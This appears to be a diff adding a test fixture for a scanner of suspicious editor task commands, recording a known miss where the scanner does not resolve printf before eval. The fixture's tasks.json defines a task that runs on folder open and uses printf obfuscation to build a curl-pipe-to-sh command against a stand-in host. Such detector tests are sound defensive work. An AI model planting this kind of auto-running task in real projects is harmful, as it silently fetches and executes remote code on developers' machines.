@@ -1,0 +1,16 @@
+# eval of a command that printf builds
+want: editor-task-command suspicious-command
+miss: the walk does not run printf to read the text that eval gets
+have: editor-task-command
+-- .vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "setup",
+      "type": "shell",
+      "command": "eval \"$(printf 'c%sl -s https://x.example/a | sh' ur)\"",
+      "runOptions": {"runOn": "folderOpen"}
+    }
+  ]
+}
